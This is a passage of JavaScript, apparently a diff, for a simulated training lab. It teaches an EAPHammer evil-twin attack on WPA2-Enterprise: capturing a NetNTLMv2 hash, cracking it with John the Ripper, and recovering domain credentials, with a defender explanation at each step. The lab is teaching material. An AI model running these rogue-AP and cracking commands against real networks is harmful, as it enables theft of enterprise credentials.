+            question: 'Wait for a domain client to auto-connect. Monitor EAPHammer output with <code>tail -f /opt/eaphammer/loot/eaphammer.log</code>',
+            hint: 'tail -f /opt/eaphammer/loot/eaphammer.log',
+            validate: c =>
+                (c.includes('tail') && c.includes('eaphammer.log')) ||
+                (c.includes('tail') && c.includes('/loot/')),
+            response: HASH_CAPTURE_OUTPUT,
+            successMessage: 'jsmith-laptop\'s Windows supplicant saw the MegaCorp-Secure SSID and automatically attempted authentication — sending the NetNTLMv2 challenge-response through our EAP server. The client accepted our rogue certificate because certificate validation was not enforced in Group Policy. Hash captured: jsmith::MEGACORP.',
+            defender: 'This attack succeeds because the client accepted an untrusted certificate. Enforcing certificate validation ("Validate server certificate" checked, specific CA selected, server name restriction) in the Wireless Network Policy GPO prevents clients from authenticating to rogue EAP servers. This is the single most impactful mitigation.'
+        },
+        {
+            /* Phase 5 – Verify captured hashes in loot directory */
+            id: 5,
+            question: 'Verify the captured hashes are written to disk with <code>ls -la /opt/eaphammer/loot/</code>',
+            hint: 'ls -la /opt/eaphammer/loot/',
+            validate: c =>
+                (c.includes('ls') && c.includes('/opt/eaphammer/loot')) ||
+                (c.includes('ls') && c.includes('loot')),
+            response: LOOT_LISTING + `\n\n<span style="color:#22c55e;">[+] hashes.txt confirmed — 1 NetNTLMv2 hash captured\n    cat /opt/eaphammer/loot/hashes.txt to inspect</span>`,
+            successMessage: 'hashes.txt is present in the loot directory. The 184-byte file contains the full NetNTLMv2 challenge-response blob for jsmith. This file is now ready for offline cracking — it never needs to touch the target network again.',
+            defender: 'Endpoint DLP and filesystem monitoring (auditd, Sysmon) on the rogue host would expose the attacker\'s collection. From the victim side, failed EAP authentication attempts are logged by the legitimate RADIUS server — correlating 802.1X failures from known clients against known AP BSSIDs reveals the rogue AP attack in progress.'
+        },
+        {
+            /* Phase 6 – Crack with John the Ripper using mask attack */
+            id: 6,
+            question: 'Crack the NetNTLMv2 hash with John the Ripper using a mask attack: <code>john --format=netntlm /opt/eaphammer/loot/hashes.txt --mask=\'Badpass?d\'</code>',
+            hint: "john --format=netntlm /opt/eaphammer/loot/hashes.txt --mask='Badpass?d'",
+            validate: c =>
+                c.includes('john') &&
+                (c.includes('--format=netntlm') || c.includes('--format=netntlmv2') || c.includes('format=netntlm')) &&
+                c.includes('hashes.txt') &&
+                (c.includes('--mask') || c.includes('mask')),
+            response: JOHN_CRACK_OUTPUT,
+            successMessage: 'CRACKED: Badpass1 — The mask "Badpass?d" matches the password pattern Badpass followed by a single digit (0-9). John tested all 10 combinations in under 2 seconds. This demonstrates how predictable password policies ("must contain a number") dramatically reduce the real-world keyspace when an attacker can guess the base word.',
+            defender: 'NetNTLMv2 hashes are relatively fast to crack with GPU acceleration (billions of attempts per second on modern hardware). Strong, random passphrases of 20+ characters are required to resist offline cracking. Consider disabling NTLM entirely via Group Policy (Network Security: LAN Manager authentication level = NTLMv2 only, then migrate to Kerberos-only where possible). Also implement LAPS to ensure unique local admin passwords.'
+        },
+        {
+            /* Phase 7 – Verify cracked credentials */
+            id: 7,
+            question: 'Verify the cracked credentials with <code>john --show /opt/eaphammer/loot/hashes.txt</code>',
+            hint: 'john --show /opt/eaphammer/loot/hashes.txt',
+            validate: c =>
+                c.includes('john') &&
+                c.includes('--show') &&
+                (c.includes('hashes.txt') || c.includes('loot')),
+            response: JOHN_SHOW_OUTPUT + `\n\n<span style="color:#a855f7;">[*] Recovered credential:
+    Domain   : MEGACORP
+    Username : jsmith
+    Password : Badpass1
+[*] This credential is valid for:
+    - Domain login (RDP, SMB, WinRM)
+    - VPN authentication
+    - OWA / Exchange Web Access
+    - Any service using Active Directory authentication</span>`,
+            successMessage: 'Credential confirmed: jsmith / Badpass1 on MEGACORP domain. A single captured hash has yielded a plaintext password valid across every AD-integrated service in the enterprise. This is why WPA2-Enterprise with PEAP/MSCHAPv2 and no certificate validation is dangerous — one rogue AP, one credential, enterprise-wide access.',
+            defender: 'Assume credential compromise after any PEAP/MSCHAPv2 capture incident. Immediate response: (1) force password reset for affected users, (2) review authentication logs for lateral movement, (3) check for pass-the-hash indicators using tools like BloodHound. Long-term: migrate supplicants to EAP-TLS (certificate-based, no password transmitted) and enable Azure AD Conditional Access to restrict authentications from unfamiliar devices.'
+        },
+        {
+            /* Phase 8 – Clean up and stop rogue AP */
+            id: 8,
+            question: 'Stop the rogue access point and restore the interface with <code>eaphammer --stop && ip link set a-wlan0 down</code>',
+            hint: 'eaphammer --stop && ip link set a-wlan0 down',
+            validate: c =>
+                (c.includes('eaphammer') && (c.includes('--stop') || c.includes('stop'))) ||
+                (c.includes('ip link') && c.includes('down') && c.includes('a-wlan0')) ||
+                (c.includes('killall') && c.includes('hostapd')),
+            response: `<span style="color:#6b7280;">[*] Sending SIGTERM to hostapd-eaphammer (PID 4821)...</span>
+<span style="color:#6b7280;">[*] Stopping EAP server...</span>
+<span style="color:#6b7280;">[*] Flushing iptables NAT rules...</span>
+<span style="color:#22c55e;">[+] Rogue AP stopped. a-wlan0 brought down.</span>
+<span style="color:#6b7280;">[*] Loot preserved at: /opt/eaphammer/loot/hashes.txt</span>
+<span style="color:#a855f7;">
+[*] Post-engagement checklist:
+    [x] Rogue AP stopped
+    [x] Interface brought down
+    [ ] Securely archive or delete loot files per ROE
+    [ ] Document captured credentials in pentest report
+    [ ] Notify client of affected users for forced password reset</span>`,
+            successMessage: 'Rogue AP shut down cleanly. a-wlan0 brought back to a managed state. Always stop the rogue AP promptly after hash capture — an active rogue AP creates ongoing risk and disrupts legitimate client connectivity. Loot files are sensitive data subject to the scope agreement and must be handled per the rules of engagement.',
+            defender: 'Post-incident response for a rogue AP discovery: (1) identify all clients that associated with the rogue BSSID via WIDS logs, (2) assume all AD credentials presented during that window are compromised, (3) force immediate password resets, (4) review event logs for authentication activity using captured credentials, (5) file a security incident report and brief leadership. Time between exposure and response is critical.'
+        }
+    ];
+
+    /* ── Lab state ───────────────────────────────────────────────── */
+    const state = {
+        currentTask:    0,
+        results:        {},   // index -> 'correct' | 'skipped'
+        attempts:       {},   // index -> count
+        rogueApRunning: false,
+        hashCaptured:   false
+    };
+
+    /* ── Initialise LinuxTerminal and simulated filesystem ──────── */
+    function init() {
+        LinuxTerminal.init('WIFIFORGE-05', '#terminal', {
+            user:      'pentester',
+            hostname:  'kali',
+            startDir:  '/home/pentester',
+            height:    '100%',
+            onCommand: handleCommand,
+            objectives: TASKS.map(t => ({
+                id:   `obj${t.id}`,
+                desc: t.question.replace(/<[^>]+>/g, '').substring(0, 52)
+            }))
+        });
+
+        /* Simulated filesystem — EAPHammer tool paths and loot dir */
+        LinuxTerminal.addFilesystem({
+            '/home/pentester': {
+                type: 'dir', perms: 'drwxr-xr-x', owner: 'pentester', group: 'pentester',
+                children: ['.bashrc', '.bash_history']
+            },
+            '/opt/eaphammer': {
+                type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root',
+                children: ['eaphammer', 'certs', 'loot']
+            },
+            '/opt/eaphammer/eaphammer': {
+                type: 'file', perms: '-rwxr-xr-x', owner: 'root', group: 'root',
+                size: 52182,
+                content: '[EAPHammer binary — enterprise evil twin / credential capture tool]'
+            },
+            '/opt/eaphammer/certs': {
+                type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root',
+                children: []
+            },
+            '/opt/eaphammer/loot': {
+                type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root',
+                children: []
+            },
+            '/usr/share/wordlists': {
+                type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root',
+                children: ['rockyou.txt']
+            },
+            '/usr/share/wordlists/rockyou.txt': {
+                type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root',
+                size: 139921497,
+                content: '123456\npassword\n12345678\n... (14,344,392 entries)'
+            }
+        });
+
+        buildObjList();
+        document.getElementById('totalTasks').textContent = TASKS.length;
+        showTask(0);
+
+        /* Welcome message printed to terminal */
+        LinuxTerminal.print(`<span style="color:#a855f7;">[ WifiForge Lab 05: EAPHammer Evil Twin ]</span>`);
+        LinuxTerminal.print(`<span style="color:#6b7280;">Target environment: MegaCorp enterprise wireless — WPA2-Enterprise (802.1X)</span>`);
+        LinuxTerminal.print(`<span style="color:#6b7280;">Tools available: eaphammer, airodump-ng, john</span>`);
+        LinuxTerminal.print(`<span style="color:#6b7280;">Type <span style="color:#c084fc;">help</span> for available commands or <span style="color:#c084fc;">objectives</span> to list tasks.</span>\n`);
+    }
+
+    /* ── Build objectives list in sidebar ────────────────────────── */
+    function buildObjList() {
+        document.getElementById('objList').innerHTML = TASKS.map((t, i) => `
+            <li class="obj-item${i === 0 ? ' active' : ''}" data-task="${i}" id="obj-item-${i}">
+                <div class="obj-check" id="obj-check-${i}">${i + 1}</div>
+                <span>${t.question.replace(/<[^>]+>/g, '').substring(0, 55)}${t.question.replace(/<[^>]+>/g, '').length > 55 ? '...' : ''}</span>
+            </li>`).join('');
+    }
+
+    /* ── Display the current task in the prompt strip ────────────── */
+    function showTask(i) {
+        const t = TASKS[i];
+        state.currentTask = i;
+        state.attempts[i] = state.attempts[i] || 0;
+
+        document.getElementById('taskNumber').textContent = i + 1;
+        document.getElementById('taskNumber').className = 'task-number';
+        document.getElementById('currentTaskNum').textContent = i + 1;
+        document.getElementById('taskQuestion').innerHTML = t.question;
+        document.getElementById('taskHint').textContent = t.hint;
+        document.getElementById('taskHint').classList.remove('show');
+        document.getElementById('feedbackMessage').textContent = 'Enter your command...';
+        document.getElementById('feedbackMessage').className = 'feedback-message';
+        document.getElementById('skipBtn').disabled = false;
+        document.getElementById('hintBtn').disabled = false;
+
+        /* Highlight active item in sidebar */
+        document.querySelectorAll('.obj-item').forEach((el, j) => {
+            el.classList.remove('active');
+            if (j === i && !state.results[j]) el.classList.add('active');
+        });
+
+        LinuxTerminal.print(`\n<span style="color:#9333ea;">--- Objective ${i + 1} of ${TASKS.length} ---</span>`);
+    }
+
+    /* ── Handle all terminal input ───────────────────────────────── */
+    function handleCommand(cmdLine, output, cmd, args) {
+        const c = cmdLine.trim();
+        const t = TASKS[state.currentTask];
+
+        state.attempts[state.currentTask] = (state.attempts[state.currentTask] || 0) + 1;
+
+        /* Built-in passthrough commands — always allowed, no penalty */
+        const passthroughs = ['clear', 'help', 'ls', 'cat', 'cd', 'pwd', 'whoami', 'uname', 'man', 'which'];
+        if (passthroughs.includes(cmd)) return;
+
+        /* objectives command — list all tasks and their status */
+        if (cmd === 'objectives') {
+            LinuxTerminal.print(`<span style="color:#a855f7;">Objectives:</span>`);
+            TASKS.forEach((task, i) => {
+                const status = state.results[i] === 'correct' ? '<span style="color:#22c55e;">[DONE]</span>' :
+                               state.results[i] === 'skipped' ? '<span style="color:#f59e0b;">[SKIP]</span>' :
+                               i === state.currentTask ? '<span style="color:#9333ea;">[CURR]</span>' :
+                               '<span style="color:#374151;">[ -- ]</span>';
+                LinuxTerminal.print(`  ${status} ${i + 1}. ${task.question.replace(/<[^>]+>/g, '').substring(0, 60)}`);
+            });
+            return;
+        }
+
+        /* ifconfig — informational fallback for interface inspection */
+        if (cmd === 'ifconfig') {
+            LinuxTerminal.print(
+`eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 192.168.10.200  netmask 255.255.255.0  broadcast 192.168.10.255
+        ether 08:00:27:4c:2b:7f  txqueuelen 1000  (Ethernet)
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+
+wlan0mon: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        unspec 00-11-22-33-44-00  txqueuelen 1000  (UNSPEC)
+        [monitor mode enabled]
+
+a-wlan0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
+        ether ${ROGUE_BSSID}  txqueuelen 1000  (Ethernet)
+        [second wireless interface — for rogue AP injection]`
+            );
+            return;
+        }
+
+        /* cat on hashes.txt — only works after hash capture (objective 4) */
+        if (cmd === 'cat' && c.includes('hashes.txt')) {
+            if (!state.hashCaptured) {
+                LinuxTerminal.print('<span style="color:#ef4444;">cat: /opt/eaphammer/loot/hashes.txt: No such file or directory\nRun EAPHammer first and wait for a client to authenticate (objectives 3-4).</span>');
+            } else {
+                LinuxTerminal.print(`<span style="color:#22c55e;">${CAPTURED_HASH}</span>`);
+            }
+            return;
+        }
+
+        /* eaphammer without --creds — guide the user */
+        if (cmd === 'eaphammer' && !c.includes('--creds') && !c.includes('--stop') && !c.includes('stop')) {
+            LinuxTerminal.print('<span style="color:#f59e0b;">eaphammer: missing --creds flag. Credential capture mode requires --creds. Example: eaphammer -e MegaCorp-Secure --creds --interface a-wlan0</span>');
+            return;
+        }
+
+        /* john without format flag — helpful error before correct usage */
+        if (cmd === 'john' && !c.includes('--format') && !c.includes('--show')) {
+            LinuxTerminal.print('<span style="color:#f59e0b;">john: specify hash format with --format=netntlm for NetNTLMv2 hashes. Example: john --format=netntlm hashes.txt --mask=\'Badpass?d\'</span>');
+            return;
+        }
+
+        /* Check answer against the current task validator */
+        if (t.validate(c)) {
+            /* Print realistic tool output for this task */
+            LinuxTerminal.print(`<span style="color:#9ca3af;">${t.response}</span>`);
+
+            /* Track state transitions between objectives */
+            if (state.currentTask === 2) {
+                /* EAPHammer rogue AP is now running */
+                state.rogueApRunning = true;
+            }
+            if (state.currentTask === 3) {
+                /* Hash captured after client auto-connects */
+                state.hashCaptured = true;
+
+                /* Populate loot filesystem so cat/ls work afterward */
+                LinuxTerminal.addFilesystem({
+                    '/opt/eaphammer/loot/hashes.txt': {
+                        type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root',
+                        size: 184,
+                        content: CAPTURED_HASH
+                    },
+                    '/opt/eaphammer/loot/eaphammer.log': {
+                        type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root',
+                        size: 1841,
+                        content: '[EAPHammer session log — 2025-09-22 08:14 to 08:19]'
+                    },
+                    '/opt/eaphammer/certs/ca.pem': {
+                        type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root',
+                        size: 1822,
+                        content: '-----BEGIN CERTIFICATE-----\n[Rogue CA certificate generated by EAPHammer]\n-----END CERTIFICATE-----'
+                    },
+                    '/opt/eaphammer/certs/server.pem': {
+                        type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root',
+                        size: 2048,
+                        content: '-----BEGIN CERTIFICATE-----\n[Rogue server certificate for MegaCorp-Secure]\n-----END CERTIFICATE-----'
+                    }
+                });
+            }
+            if (state.currentTask === 7) {
+                /* Rogue AP stopped, interface down */
+                state.rogueApRunning = false;
+            }
+
+            /* Print educational success message and defender perspective */
+            LinuxTerminal.print(`\n<span style="color:#a855f7;">${t.successMessage}</span>`);
+            LinuxTerminal.print(`<span style="color:#3b82f6;">[DEFENDER] ${t.defender}</span>`);
+
+            /* Mark objective complete in the LinuxTerminal HUD */
+            LinuxTerminal.completeObjective(`obj${t.id}`);
+
+            /* Update UI state */
+            const shortMsg = t.successMessage.substring(0, 72) + '...';
+            document.getElementById('feedbackMessage').textContent = shortMsg;
+            document.getElementById('feedbackMessage').className = 'feedback-message success';
+            state.results[state.currentTask] = 'correct';
+            markObjItem(state.currentTask, 'completed');
+            document.getElementById('taskNumber').classList.add('completed');
+            document.getElementById('skipBtn').disabled = true;
+            document.getElementById('hintBtn').disabled = true;
+
+            /* Show the defender insight box in sidebar */
+            document.getElementById('defenderBox').classList.add('show');
+            document.getElementById('defenderText').textContent = t.defender;
+
+            updateProgress();
+            setTimeout(() => advanceTask(), 2400);
+
+        } else if (c !== '') {
+            /* Wrong command — provide context-aware error feedback */
+            let errMsg = '<span class="lt-error">Command not recognised for this objective. Check syntax and required flags.</span>';
+
+            if (c.includes('eaphammer') && !state.rogueApRunning && state.currentTask > 2) {
+                errMsg = '<span style="color:#ef4444;">Rogue AP is not running. Launch EAPHammer first (objective 3) before monitoring for clients.</span>';
+            } else if (c.includes('john') && !state.hashCaptured) {
+                errMsg = '<span style="color:#ef4444;">No hash file to crack yet. Capture NetNTLMv2 hashes first (objectives 3-4).</span>';
+            } else if (c.includes('tail') && !state.rogueApRunning) {
+                errMsg = '<span style="color:#ef4444;">EAPHammer is not running. Start the rogue AP first (objective 3) then monitor the log.</span>';
+            }
+
+            LinuxTerminal.print(errMsg);
+
+            /* Auto-reveal hint text (no score penalty) after 3 failed attempts */
+            if (state.attempts[state.currentTask] >= 3) {
+                document.getElementById('taskHint').classList.add('show');
+            }
+        }
+    }
+
+    /* ── Show hint on demand (costs 5 points) ────────────────────── */
+    function showHint() {
+        if (document.getElementById('hintBtn').disabled) return;
+        score.hints += 5;
+        document.getElementById('taskHint').classList.add('show');
+        document.getElementById('hintBtn').disabled = true;
+        updateScoreDisplay();
+        LinuxTerminal.print(`<span style="color:#f59e0b;">[HINT -5 pts] ${TASKS[state.currentTask].hint}</span>`);
+    }
+
+    /* ── Skip current task ───────────────────────────────────────── */
+    function skipTask() {
+        if (document.getElementById('skipBtn').disabled) return;
+        state.results[state.currentTask] = 'skipped';
+        markObjItem(state.currentTask, 'skipped');
+        document.getElementById('taskNumber').classList.add('skipped');
+        document.getElementById('skipBtn').disabled = true;
+        document.getElementById('hintBtn').disabled = true;
+        document.getElementById('feedbackMessage').innerHTML =
+            `<strong>Skipped.</strong> Answer: <code style="background:rgba(147,51,234,0.2);padding:1px 6px;border-radius:4px;color:#c084fc;">${TASKS[state.currentTask].hint}</code>`;
+        LinuxTerminal.print(`<span style="color:#f59e0b;">[SKIPPED] Answer: ${TASKS[state.currentTask].hint}</span>`);
+        updateProgress();
+        setTimeout(() => advanceTask(), 900);
+    }
+
+    /* ── Advance to next task or trigger completion modal ─────────── */
+    function advanceTask() {
+        if (state.currentTask >= TASKS.length - 1) {
+            showResults();
+            return;
+        }
+        showTask(state.currentTask + 1);
+    }
+
+    /* ── Update sidebar objective item styling ────────────────────── */
+    function markObjItem(i, status) {
+        const el = document.getElementById(`obj-item-${i}`);
+        const ch = document.getElementById(`obj-check-${i}`);
+        if (!el || !ch) return;
+        el.classList.remove('active', 'completed', 'skipped');
+        el.classList.add(status);
+        ch.innerHTML = status === 'completed' ? '&#10003;' : '&#8212;';
+    }
+
+    /* ── Update progress bar and score readouts ───────────────────── */
+    function updateProgress() {
+        const completed = Object.values(state.results).filter(r => r === 'correct').length;
+        const total     = Object.keys(state.results).length;
+        const pct       = Math.round((total / TASKS.length) * 100);
+
+        document.getElementById('progressFill').style.width = pct + '%';
+        document.getElementById('completedCount').textContent = completed;
+        document.getElementById('progressPct').textContent = pct + '%';
+
+        updateScoreDisplay();
+    }
+
+    function updateScoreDisplay() {
+        const current = Math.max(0, score.base - score.hints);
+        document.getElementById('scoreFinal').textContent = current;
+        document.getElementById('headerScore').textContent = current;
+        document.getElementById('scoreHintDeduct').textContent = `-${score.hints} pts`;
+    }
+
+    /* ── Show completion modal and register module progress ───────── */
+    function showResults() {
+        const completed = Object.values(state.results).filter(r => r === 'correct').length;
+        const skipped   = Object.values(state.results).filter(r => r === 'skipped').length;
+        const finalPts  = Math.max(0, score.base - score.hints);
+
+        document.getElementById('modalCompleted').textContent = completed;
+        document.getElementById('modalSkipped').textContent   = skipped;
+        document.getElementById('modalScore').textContent     = finalPts;
+
+        const modal = document.getElementById('modalContent');
+        modal.classList.remove('perfect');
+
+        if (completed === TASKS.length) {
+            modal.classList.add('perfect');
+            document.getElementById('modalIcon').innerHTML = '&#128293;';
+            document.getElementById('modalTitle').textContent = 'Perfect Run!';
+            document.getElementById('modalMessage').textContent =
+                'Full EAPHammer workflow executed without hints or skips. Enterprise hash capture and cracking mastered.';
+        } else {
+            document.getElementById('modalIcon').innerHTML = '&#128275;';
+            document.getElementById('modalTitle').textContent = 'Lab Complete';
+            document.getElementById('modalMessage').textContent =
+                `${completed}/${TASKS.length} objectives completed. Review skipped steps to master the full enterprise evil twin workflow.`;
+        }
+
+        document.getElementById('resultsModal').classList.add('show');
+
+        /* Register lab completion with ModuleProgress */
+        try {
+            if (typeof ModuleProgress !== 'undefined') {
+                ModuleProgress.complete('dark-arts', 'wifi-lab-05', {
+                    returnUrl: '../index.html'
+                });
+            }
+        } catch (e) { /* non-fatal — lab completion records locally */ }
+
+        /* AchievementManager hooks for notable outcomes */
+        try {
+            if (typeof AchievementManager !== 'undefined') {
+                if (completed === TASKS.length && score.hints === 0) {
+                    AchievementManager.unlock('ghost_ap');       // perfect run, no hints
+                }
+                if (completed >= 6) {
+                    AchievementManager.unlock('hash_collector'); // captured and cracked
+                }
+                if (skipped === 0 && completed >= 5) {
+                    AchievementManager.unlock('eap_slayer');     // no skips
+                }
+            }
+        } catch (e) { /* non-fatal */ }
+    }
+
+    /* ── Restart lab from scratch ─────────────────────────────────── */
+    function restartLab() {
+        document.getElementById('resultsModal').classList.remove('show');
+        document.getElementById('defenderBox').classList.remove('show');
+        score.hints = 0;
+        state.currentTask    = 0;
+        state.results        = {};
+        state.attempts       = {};
+        state.rogueApRunning = false;
+        state.hashCaptured   = false;
+        updateScoreDisplay();
+        LinuxTerminal.destroy();
+        init();
+    }
+
+    /* ── Boot ──────────────────────────────────────────────────────── */
+    document.addEventListener('DOMContentLoaded', init);
+    </script>
+
+    <!-- Progress tracking and flux components load after game logic -->
+    <script src="../../../../components/FluxCapacitor.js"></script>
+
+</body>
+</html>
